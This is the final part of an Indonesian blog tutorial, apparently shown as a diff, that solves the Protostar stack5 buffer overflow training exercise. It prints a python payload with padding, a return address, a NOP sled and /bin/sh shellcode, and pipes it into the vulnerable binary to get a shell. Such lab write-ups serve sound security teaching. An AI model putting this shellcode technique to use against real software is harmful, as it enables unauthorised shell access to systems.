+<p>Tidak terjadi apa - apa, bahkan error sekalipun. Hal ini diakibatkan karena shell langsung tertutup setelah dijalankan. Untuk mengatasinya kita akan menggunakan bantuan <code class="language-text">cat</code> untuk menjaga shell tetap terbuka dan memungkinkan kita untuk memasukkan input. Gunakan <code class="language-text">man cat</code> jika ingin membaca manual dari utilitas cat.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">"print( 'A' * 76 + '<span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xbf">\xbf</span>' + '<span class="token entity" title="\x90">\x90</span>'* 60 + '<span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span>')"</span>  <span class="token operator">></span> /tmp/payload
+<span class="token punctuation">(</span>cat /tmp/payload<span class="token punctuation">;</span> <span class="token function">cat</span><span class="token punctuation">)</span> <span class="token operator">|</span> ./stack5</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 765px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/16dde6bf61eec10ab8b30ce02ecebf2d/bbb77/protostar-stack5-12.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA90lEQVQY012Q607CQBCFF9EIGkG0YPDS1EpQQbyltJReKO2WSoX4/k9znBlEoj++nJ3dnTNnV90kBe6XX7hKPoRb/QkzLWFlJezFGt04R/09RMOd4Yj02IlQewvQmsx/2daNcQzVjTQsMrEXKzHqFWvY+Qp3VF/OCtE+DbR0ifNpiosoJ81EmXaghaaX4IQNTUpoUhojyIRrStkm5YmdUMuaG3jNKQ0y64ScOkBl6KI6muDwdQr14EA9EvzkGj1FDVzsjTxUnjy5qIabmhv2n3ccvPikvpyrwXjHT48y/DnO/FTiMqcUnZM0PfozJ/7b9J+tibDZ+wbI05cm2w4pPgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="menjalankan stack5 dengan payload"
+        title="menjalankan stack5 dengan payload"
+        src="/static/16dde6bf61eec10ab8b30ce02ecebf2d/bbb77/protostar-stack5-12.png"
+        srcset="/static/16dde6bf61eec10ab8b30ce02ecebf2d/772e8/protostar-stack5-12.png 200w,
+/static/16dde6bf61eec10ab8b30ce02ecebf2d/e17e5/protostar-stack5-12.png 400w,
+/static/16dde6bf61eec10ab8b30ce02ecebf2d/bbb77/protostar-stack5-12.png 765w"
+        sizes="(max-width: 765px) 100vw, 765px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Berhasil! kalian dapat mengonfirmasi dengan memasukkan perintah <code class="language-text">id</code> dan dengan <code class="language-text">whoami</code>. Untuk keluar gunakan <strong>ctrl+c</strong>.</p></div></div><footer style="margin-top:5rem;text-align:center"><p>By <a href="http://rochimfn.github.io/contact/">Rochim</a></p><a href="mailto:rochim.noviyan@gmail.com"><svg aria-hidden="true" focusable="false" data-prefix="far" data-icon="envelope" class="svg-inline--fa fa-envelope fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="color:;margin-right:10px"><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg></a><a href="https://t.me/rochimfn"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="telegram" class="svg-inline--fa fa-telegram fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" style="color:#0088cc;margin-right:10px"><path fill="currentColor" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"></path></svg></a><a href="https://github.com/rochimfn"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" class="svg-inline--fa fa-github fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" style="color:#24292e;margin-right:10px"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://www.linkedin.com/in/rochim-farul-noviyan-421292164"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" class="svg-inline--fa fa-linkedin fa-w-14 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="color:#0e76a8;margin-right:10px"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg></a><a href="https://twitter.com/rochimfn"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter" class="svg-inline--fa fa-twitter fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="color:#1DA1F2;margin-right:10px"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://instagram.com/rochim.noviyan"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="instagram" class="svg-inline--fa fa-instagram fa-w-14 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="color:#C13584;margin-right:10px"><path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path></svg></a><a href="https://www.facebook.com/rochim.farulnoviyan"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="facebook" class="svg-inline--fa fa-facebook fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="color:#4267B2;margin-right:10px"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg></a></footer></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/belajar-reversing-protostar-stack5/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"app":["/app-0842d1f2308dcbc38b7d.js"],"component---src-pages-about-js":["/component---src-pages-about-js-4ff5669701838a73c39b.js"],"component---src-pages-blog-js":["/component---src-pages-blog-js-1ada6ead1510deb1c65a.js"],"component---src-pages-contact-js":["/component---src-pages-contact-js-bf91673d3ab0f16a69a9.js"],"component---src-pages-index-js":["/component---src-pages-index-js-4aebeffff6c1fe562c2a.js"],"component---src-templates-blog-post-js":["/component---src-templates-blog-post-js-0314926304c56436cd57.js"]};/*]]>*/</script><script src="/component---src-templates-blog-post-js-0314926304c56436cd57.js" async=""></script><script src="/commons-28905493922b46291e52.js" async=""></script><script src="/a9a7754c-a89164b92346a482070c.js" async=""></script><script src="/app-0842d1f2308dcbc38b7d.js" async=""></script><script src="/styles-fa79fef4936efa84b233.js" async=""></script><script src="/framework-8dcecaaefd71e2213eb2.js" async=""></script><script src="/webpack-runtime-291198205a3604934848.js" async=""></script></body></html>
